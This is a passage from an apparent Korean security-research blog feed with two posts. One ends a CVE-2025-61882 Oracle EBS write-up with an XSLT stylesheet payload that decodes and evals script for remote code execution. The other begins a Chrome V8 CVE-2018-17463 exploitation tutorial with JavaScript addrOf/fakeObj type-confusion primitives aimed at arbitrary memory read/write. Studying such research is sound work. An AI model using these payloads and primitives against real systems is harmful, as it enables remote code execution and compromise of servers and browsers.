&#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. XSLT &#xC5D4;&#xC9C4;&#xC774; &#xD655;&#xC7A5; &#xD568;&#xC218;/&#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xD0C0;&#xC77C;&#xC2DC;&#xD2B8; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; RCE&#xB97C; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><strong>XSL &#xC2A4;&#xD0C0;&#xC77C;&#xC2DC;&#xD2B8; (payload)</strong></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/1999/XSL/Transform&gt;&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder&gt;&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:jsm</span>=<span class="hljs-string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager&gt;&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:eng</span>=<span class="hljs-string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine&gt;&quot;</span></span><span class="hljs-tag">                    <span class="hljs-attr">xmlns:str</span>=<span class="hljs-string">&quot;&lt;http://www.oracle.com/XSL/Transform/java/java.lang.String&gt;&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&apos;[base64_encoded_payload]&apos;)&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;js&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;str:new($bs)&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;m&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;jsm:new()&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;e&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;jsm:getEngineByName($m, &apos;js&apos;)&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;eng:eval($e, $js)&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$code&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span></code></pre><p>&#xC704; XSL &#xC2A4;&#xD0C0;&#xC77C;&#xC2DC;&#xD2B8;&#xB294; Base64&#xB85C; &#xC228;&#xAE34; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBCF5;&#xC6D0;&#xD558;&#xACE0;, <code>ScriptEngine</code>&#xC73C;&#xB85C; eval&#xD574; &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; JSP&#xAC00; Host&#xC640; Port&#xB97C; &#xC2E0;&#xB8B0;&#xD574; &#xB9CC;&#xB4E0; <code>xslURL</code>&#xB85C; &#xC774; &#xC6D0;&#xACA9; XSL &#xC2A4;&#xD0C0;&#xC77C;&#xC2DC;&#xD2B8;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xC21C;&#xAC04; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-61882">https://nvd.nist.gov/vuln/detail/CVE-2025-61882</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Oracle/">Oracle</category>
      
      <category domain="https://hackyboiz.github.io/tags/EBS/">EBS</category>
      
      <category domain="https://hackyboiz.github.io/tags/CRLF/">CRLF</category>
      
      <category domain="https://hackyboiz.github.io/tags/SSRF/">SSRF</category>
      
      <category domain="https://hackyboiz.github.io/tags/XSLT/">XSLT</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/11/banda/CVE-2025-61882/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆Part 4.(KR)</title>
      <link>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/kr/</link>
      <guid>https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/kr/</guid>
      <pubDate>Fri, 10 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; OUYA77 &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E4;&amp;#xB4E4; &amp;#xCD94;&amp;#xC11D; &amp;#xC798; &amp;#xBCF4;&amp;#xB0B4;&amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; OUYA77 &#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB4E4; &#xCD94;&#xC11D; &#xC798; &#xBCF4;&#xB0B4;&#xC168;&#xB098;&#xC694;?</p><p>&#xC9C0;&#xB09C; &#xC2DC;&#xAC04;&#xC5D0; &#xBD84;&#xB7C9; &#xC870;&#xC808; &#xC2E4;&#xD328;&#xB85C; Read/Write primitive &#xB9CC; &#xC5BB;&#xACE0; &#xB05D;&#xB0AC;&#xB294;&#xB370;, &#xC774;&#xBC88; &#xC2DC;&#xAC04;&#xC5D0;&#xB294; RCE &#xAE4C;&#xC9C0; &#xD55C;&#xBC88; &#xAC00;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xBC88; &#xD3EC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; CVE-2018-17463&#xC5D0;&#xC11C; &#xB0A8;&#xC740; exploit&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xACFC; Heap Sandbox &#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC9C0;&#xB09C; &#xAC8C;&#xC2DC;&#xAE00; &#xBCF4;&#xAE30;<br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 1.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 2.</a><br>&#x2192; <a href="https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 3.</a></p></blockquote><h2 id="0-Recap"><a href="#0-Recap" class="headerlink" title="0. Recap"></a>0. Recap</h2><p>Part 3&#xC5D0;&#xC11C; Type Confusion&#xC744; &#xC774;&#xC6A9;&#xD574; &#xACB9;&#xCE58;&#xB294; &#xC18D;&#xC131; &#xC30D;&#xC744; &#xCC3E;&#xACE0; &#xD3EC;&#xC778;&#xD130; &#xAC1D;&#xCCB4;&#xAC00; double&#xB85C; &#xD574;&#xC11D;&#xB418;&#xC5B4;&#xC11C; double &#xD0C0;&#xC785;&#xC744; &#xC77D;&#xACE0; &#xC4F8; &#xB54C;, &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xC774; &#xD3B8;&#xD568;&#xC744; &#xD1B5;&#xD574;&#xC11C; Read/Write Primitive&#xB97C; &#xC5BB;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>The addrOf Read Primitive</li></ul><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-comment">// 1. vuln &#xD568;&#xC218; &#xB3D9;&#xC801; &#xC0DD;&#xC131; (Map &#xAC80;&#xC0AC; &#xC6B0;&#xD68C;)</span>    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // p1&#xC744; Double&#xB85C; &#xC608;&#xC0C1;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C; p2&#xC778; Object &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xB85C;&#xB4DC;&#xB428;</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x; </span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>}; <span class="hljs-comment">// &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB300;&#xC0C1; &#xAC1D;&#xCCB4;</span>    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>}; <span class="hljs-comment">// Double (&#xC608;&#xC0C1; &#xD0C0;&#xC785;)</span>    pValues[p2] = {<span class="hljs-attr">y</span>: obj}; <span class="hljs-comment">// Object (&#xC2E4;&#xC81C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xAC12;)</span>    <span class="hljs-comment">// 2. JIT &#xCD5C;&#xC801;&#xD654; &#xBC0F; Type Confusion &#xC720;&#xB3C4;</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-comment">// &#xBC18;&#xD658; &#xAC12;&#xC774; 13.37&#xC774; &#xC544;&#xB2C8;&#xBA74; (&#xC989;, &#xC8FC;&#xC18C;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xBA74;) &#xC131;&#xACF5;</span>        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>; <span class="hljs-comment">// &#xC8FC;&#xC18C; &#xBC18;&#xD658; &#xBC0F; &#xD0DC;&#xADF8; &#xC81C;&#xAC70;</span>        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><ul><li>The fakeObj Write Primitive</li></ul><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res;        }    }}</code></pre><p>&#xC774;&#xC81C; &#xC8FC;&#xC18C;&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xB294; read primitive&#xC640; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xB294; write primitive&#xB97C; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8;, &#xC774;&#xB97C; exploit&#xC744; &#xC704;&#xD574; &#xC784;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(AAR/AAW) primitive&#xB85C; &#xC815;&#xAD50;&#xD558;&#xAC8C; &#xB2E4;&#xB4EC;&#xC5B4; &#xBCF4;&#xBA70; RCE&#xB97C; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-CVE-2018-17463-cont&#x2019;d-For-RCE"><a href="#1-CVE-2018-17463-cont&#x2019;d-For-RCE" class="headerlink" title="1. CVE-2018-17463 (cont&#x2019;d) - For RCE"></a>1. CVE-2018-17463 (cont&#x2019;d) - For RCE</h1><h2 id="1-1-Relative-R-W-&#x2192;-AAR-W"><a href="#1-1-Relative-R-W-&#x2192;-AAR-W" class="headerlink" title="1.1 Relative R/W &#x2192; AAR/W"></a>1.1 Relative R/W &#x2192; AAR/W</h2><h3 id="Concept"><a href="#Concept" class="headerlink" title="Concept)"></a>Concept)</h3><p>&#xD604;&#xC7AC;&#xC758; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB294; &#xB2E4;&#xB978; &#xAC1D;&#xCCB4;&#xC758; &#xC18D;&#xC131; &#xAC12;(&#xD3EC;&#xC778;&#xD130;)&#xC744; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xC784;&#xC758;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xB370;&#xB294; &#xC720;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBB38;&#xC81C;&#xB294; <strong>V8 &#xC5D4;&#xC9C4;&#xC758; &#xAC1D;&#xCCB4; &#xAD00;&#xB9AC; &#xBC29;&#xC2DD;</strong>&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; Type Confusion&#xC744; &#xC774;&#xC6A9;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;(e.g., <code>0x41414141</code>)&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xB354;&#xB77C;&#xB3C4;, V8&#xC740; &#xB36E;&#xC5B4;&#xC4F4; &#xADF8; &#xC8FC;&#xC18C;&#xB97C; &#xC5EC;&#xC804;&#xD788; <strong>&#xC720;&#xD6A8;&#xD55C; JavaScript &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;</strong>&#xB85C; &#xCDE8;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, &#xC6B0;&#xB9AC;&#xAC00; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xB123;&#xC744; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xC4F4;&#xB2E4; &#xD574;&#xB3C4;, V8&#xC740; &#xC774; &#xC8FC;&#xC18C;&#xB85C; &#xC774;&#xB3D9;&#xD55C; &#xB2E4;&#xC74C; &#xAC1D;&#xCCB4;&#xC758; &#xB0B4;&#xBD80; &#xAD6C;&#xC870;(e.g., &#xC624;&#xD504;&#xC14B; 8&#xC758; <code>backing store</code> &#xD3EC;&#xC778;&#xD130;)&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC740; V8&#xC774; &#xC608;&#xC0C1;&#xD588;&#xB358; &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xB97C; &#xCC3E;&#xC9C0; &#xBABB;&#xD574; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xAC70;&#xB098; &#xB370;&#xC774;&#xD130; &#xC870;&#xC791;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC9C4;&#xC815;&#xD55C; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;(AAR/AAW)&#xB97C; &#xD655;&#xBCF4;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAC1D;&#xCCB4; &#xC18D;&#xC131;&#xC774; &#xC544;&#xB2C8;&#xB77C; <strong>V8&#xC774; &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC; &#xBC84;&#xD37C;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xB0B4;&#xBD80; &#xD544;&#xB4DC;</strong>&#xB97C; &#xB36E;&#xC5B4;&#xC368;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC790;&#xC8FC; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xB3C4;&#xAD6C;&#xAC00; &#xBC14;&#xB85C; <strong><code>ArrayBuffer</code></strong> &#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>ArrayBuffer</code>&#xB294; &#xACE0;&#xC815;&#xB41C; &#xD06C;&#xAE30;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBC84;&#xD37C;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70;, &#xC77C;&#xBC18; &#xAC1D;&#xCCB4;&#xC640; &#xB2EC;&#xB9AC; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785; &#xBCC0;&#xD658; &#xC5C6;&#xC774; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC9C1;&#xC811; &#xB2E4;&#xB8F0; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAC1D;&#xCCB4;&#xC758; &#xB0B4;&#xBD80; &#xD544;&#xB4DC; &#xC911; &#xD558;&#xB098;&#xC778; <strong>backing_store &#xD3EC;&#xC778;&#xD130;</strong>&#xB294; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>ArrayBuffer</code>&#xC758; <code>backing_store</code>&#xB294; <code>TypedArray</code>&#xAC00; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xAE30;&#xC900;&#xC774; &#xB418;&#xBBC0;&#xB85C;, &#xC774; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xAC83;&#xC774; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC6B0;&#xB9AC;&#xAC00; &#xC774; &#xAC12;&#xC744; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xB36E;&#xC5B4;&#xC4F0;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74;, V8&#xC740; &#xC774;&#xB97C; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xB2E8;&#xC21C;&#xD788; &#xBC84;&#xD37C; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB85C; &#xAC04;&#xC8FC;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xAE30;&#xC874;&#xC758; Relative R/W&#xAC00; &#xB2E8;&#xC21C;&#xD788; &#xAC1D;&#xCCB4; &#xC811;&#xADFC; &#xB85C;&#xC9C1;&#xC744; &#xC624;&#xC791;&#xB3D9;&#xC2DC;&#xD0A4;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xC5C8;&#xB2E4;&#xBA74;, <code>backing_store</code> &#xC870;&#xC791;&#xC740; <strong>&#xC21C;&#xC218; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;(Raw Pointer)&#xB97C; &#xC9C1;&#xC811; &#xC81C;&#xC5B4;</strong>&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xBBC0;&#xB85C; &#xD6E8;&#xC52C; &#xAC15;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB9CC; <code>ArrayBuffer</code> &#xC790;&#xCCB4;&#xB85C;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC9C1;&#xC811; &#xC77D;&#xACE0; &#xC4F8; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0; <code>TypedArray</code>&#xB098; <code>DataView</code>&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xD615;&#xC2DD;(e.g., &#xBD80;&#xB3D9;&#xC18C;&#xC218;&#xC810;, 64&#xBE44;&#xD2B8; &#xC815;&#xC218; &#xB4F1;)&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC6B0;&#xB9AC;&#xB294; &#xC81C;&#xD55C;&#xC801;&#xC778; Relative R/W &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>backing_store</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0;, <code>TypedArray</code>&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xC784;&#xC758;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC77D;&#xACE0; &#xC4F0;&#xB294; &#xC644;&#xC804;&#xD55C; AAR/AAW &#xAD8C;&#xD55C;&#xC744; &#xD655;&#xBCF4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation)"></a>Exploitation)</h3><p>&#xADF8;&#xB7FC; &#xC774; &#xCEE8;&#xC149;&#xC744; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xD604;&#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; Relative Write primitive&#xC5D0; &#xC0AC;&#xC6A9;&#xD588;&#xB358; fakeObj &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span><span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span><span class="hljs-string">      // we overwrite property y of p2</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj}    ...</code></pre><p><code>fakeObj</code> primitive&#xB97C; &#xD1B5;&#xD574; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774; <code>backing store</code> &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC744;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xC77D;&#xAE30;&#xC640; &#xC4F0;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C; &#xBAA8;&#xB450;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; <code>p1</code>&#xC5D0; &#xB300;&#xD574; &#xD558;&#xB098;&#xC758; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xAC00;&#xC9C4; &#xAC1D;&#xCCB4;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0;, <code>p2</code>&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xD558;&#xB098;&#xC758; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xAC00;&#xC9C4; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>vuln</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>p1</code> &#xAC1D;&#xCCB4;&#xC758; &#xD504;&#xB85C;&#xD37C;&#xD2F0; <code>x</code>&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB3D9;&#xC791;&#xC740; <code>p1</code>&#xC758; &#xAC1D;&#xCCB4; &#xC8FC;&#xC18C;&#xB97C; &#xC5ED;&#xCC38;&#xC870;&#xD558;&#xC5EC; &#xC624;&#xD504;&#xC14B; 24&#xB97C; &#xC811;&#xADFC;&#xD558;&#xACE0;, &#xADF8;&#xACF3;&#xC5D0; &#xC778;&#xB77C;&#xC778;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB41C; <code>x</code> &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xAC12;&#xC744; &#xC77D;&#xAC70;&#xB098; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; Type confusion&#xC73C;&#xB85C; &#xC778;&#xD574;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xC774; &#xC5F0;&#xC0B0;&#xC774; 